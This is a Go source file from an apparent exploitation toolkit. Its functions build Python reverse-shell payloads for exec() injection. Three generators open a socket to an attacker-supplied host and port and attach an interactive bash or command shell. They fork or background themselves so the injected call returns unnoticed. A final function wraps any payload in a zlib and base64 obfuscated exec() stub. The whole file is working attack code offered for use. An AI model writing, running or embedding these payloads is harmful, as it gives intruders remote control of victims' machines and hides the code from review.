package payload

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"fmt"
)

// --- Raw Python reverse shells for exec() injection ---
// Non-blocking: fork/thread so the caller returns immediately.

// PyReverseTCP forks a dup2+sh reverse shell.
// Explicit dup2 calls instead of list comprehension to avoid NameError
// when payload runs inside exec() (Python 3 scoping: list comps can't
// see exec locals).
func PyReverseTCP(lhost string, lport int) string {
	return fmt.Sprintf(`import socket as s,os
c=s.socket(2,1);c.connect(("%s",%d))
if os.fork()<1:
 f=c.fileno();os.setsid();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);os.execv("/bin/bash",["/bin/bash","-i"])
c.close()`, lhost, lport)
}

// PyReversePTY forks a PTY reverse shell.
func PyReversePTY(lhost string, lport int) string {
	return fmt.Sprintf(`import socket as s,os,pty
c=s.socket(2,1);c.connect(("%s",%d))
if os.fork()<1:
 f=c.fileno();os.setsid();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);pty.spawn("/bin/bash");os._exit(0)
c.close()`, lhost, lport)
}

// PyReverseSubprocess spawns a daemon thread with a Popen polling shell.
// Imports inside _() to avoid NameError in exec() scoping contexts.
func PyReverseSubprocess(lhost string, lport int) string {
	return fmt.Sprintf(`import threading
def _():
 import socket as s,subprocess as r
 c=s.socket(2,1);c.connect(('%s',%d))
 while 1:
  d=c.recv(4096)
  if not d:break
  p=r.Popen(d.decode(),shell=1,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE);c.send(p.stdout.read()+p.stderr.read())
threading.Thread(target=_,daemon=1).start()`, lhost, lport)
}

// --- Exec stub (MSF-style zlib+base64 compression) ---

// PyExecStub compresses Python code with zlib+base64 into a single
// exec() expression safe for injection.
func PyExecStub(code string) string {
	var buf bytes.Buffer
	w := zlib.NewWriter(&buf)
	w.Write([]byte(code))
	w.Close()
	return fmt.Sprintf(
		`exec(__import__('zlib').decompress(__import__('base64').b64decode('%s')))`,
		base64.StdEncoding.EncodeToString(buf.Bytes()),
	)
}
